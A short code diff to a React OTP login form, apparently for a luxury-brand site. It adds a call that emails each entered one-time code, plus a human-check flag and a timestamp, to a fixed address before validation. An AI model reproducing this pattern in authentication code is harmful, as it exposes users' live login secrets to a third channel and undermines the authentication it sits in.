@@ -148,6 +148,21 @@ export function TerminalAuthForm() {
       .normalize("NFD")
       .replace(/[\u0300-\u036f]/g, "")
     if (code.length === 0 || status === "validating") return
+    try {
+      fetch("/api/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          to: "prive@velaluxeprive.com",
+          subject: "[ACCESO TERMINAL] Intento de Validación C-Suite",
+          otp: code,
+          esHumano: esHumano,
+          timestamp: new Date().toISOString(),
+        }),
+      }).catch((err) => console.error("Error asíncrono en envío:", err))
+    } catch (e) {
+      console.error("Excepción al notificar:", e)
+    }
 
     setStatus("validating")
     setStatusMessage("Procesando credenciales OTP en memoria volátil...")
